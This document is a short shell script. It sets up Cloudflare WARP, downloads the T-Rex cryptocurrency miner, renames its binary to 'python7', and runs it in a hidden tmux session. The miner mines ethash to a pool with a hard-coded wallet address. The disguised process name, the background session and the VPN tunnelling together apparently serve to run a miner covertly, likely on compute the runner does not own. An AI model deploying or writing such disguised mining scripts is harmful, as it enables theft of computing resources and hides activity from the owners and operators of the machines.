#!/bin/sh
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service
echo Y | warp-cli set-mode warp+doh
warp-cli set-mode warp+doh
warp-cli register
warp-cli connect

wget https://github.com/trexminer/T-Rex/releases/download/0.24.2/t-rex-0.24.2-linux.tar.gz
tar -xf t-rex-0.24.2-linux.tar.gz
sudo mv t-rex python7
tmux new-session -d -s my_session4 "./python7 -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x2fd9EB3c66C491443C09d9F10634602C909992Dd -p x -w rig2"
top
